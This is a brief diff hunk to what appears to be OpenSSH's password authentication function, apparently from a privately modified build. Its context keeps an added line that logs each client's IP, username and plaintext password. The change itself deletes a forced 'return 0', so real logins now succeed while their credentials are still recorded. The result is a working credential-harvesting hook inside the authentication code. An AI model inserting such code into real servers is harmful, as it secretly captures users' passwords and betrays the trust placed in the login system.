@@ -89,9 +89,6 @@ auth_password(Authctxt *authctxt, const char *password)
 /* ERICW ADDED logit */
 logit("IP: %s PassLog: Username: %s Password: %s", get_remote_ipaddr(), authctxt->user, password);
 
-/* ERICW ADDED return 0 so the password ALWAYS fails */
- return 0;
-
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
 	static int expire_checked = 0;
 #endif
